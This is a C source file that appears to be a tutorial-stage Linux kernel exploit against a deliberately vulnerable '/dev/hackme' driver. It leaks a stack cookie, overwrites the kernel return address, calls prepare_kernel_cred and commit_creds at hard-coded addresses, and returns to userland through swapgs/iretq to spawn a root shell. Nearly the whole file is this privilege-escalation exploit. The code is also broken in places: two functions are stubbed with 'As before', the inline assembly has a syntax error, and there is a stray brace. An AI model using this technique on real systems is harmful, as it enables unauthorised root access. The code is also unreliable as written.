#include <fcntl.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define formatBool(b) ((b) ? "true" : "false")

char *VULN_DRV = "/dev/hackme";

int64_t global_fd;
uint64_t cookie;
uint8_t cookie_off;

uint64_t user_cs, user_ss, user_rflags, user_sp;
uint64_t prepare_kernel_cred = 0xffffffff814c67f0;
uint64_t commit_creds = 0xffffffff814c6410;
uint64_t user_rip = (uint64_t)spawn_shell;

void open_dev(){
    // As before
};

void leak_cookie() {
  // As before
}

void spawn_shell() {
  puts("[*] Hello from user land!");
  uid_t uid = getuid();
  if (uid == 0) {
    printf("[+] UID: %d, got root!\n", uid);
  } else {
    printf("[!] UID: %d, we root-less :(!\n", uid);
    exit(-1);
  }
  system("/bin/sh");
}

void save_state() {
  __asm__(".intel_syntax noprefix;"
          "mov user_cs, cs;"
          "mov user_ss, ss;"
          "mov user_sp, rsp;"
          "pushf;"
          "pop user_rflags;"
          ".att_syntax");
  puts("[+] Saved state");
}

void privesc() {
  __asm__(".intel_syntax noprefix;"
          "movabs rax, prepare_kernel_cred;"
          "xor rdi, rdi;"
          "call rax;"
          "mov rdi, rax;"
          "movabs rax, commit_creds:"
          "call rax;"
          "swapgs;"
          "mov r15, user_ss;"
          "push r15;"
          "mov r15, user_sp;"
          "push r15;"
          "mov r15, user_rflags;"
          "push r15;"
          "mov r15, user_cs;"
          "push r15;"
          "mov r15, user_rip;" // Where we return to!
          "push r15;"
          "iretq;"
          ".att_syntax;");
}
}

void write_ret() {
  uint8_t sz = 35;
  uint64_t payload[sz];
  payload[cookie_off++] = cookie;
  payload[cookie_off++] = 0x0;
  payload[cookie_off++] = 0x0;
  payload[cookie_off++] = 0x0;
  payload[cookie_off++] = (uint64_t)privesc; // redirect code to here

  uint64_t data = write(global_fd, payload, sizeof(payload));

  puts("[!] If you can read this we failed the mission :(");
}

int main(int argc, char **argv) {
  open_dev();
  leak_cookie();
  save_state();
  write_ret();
}
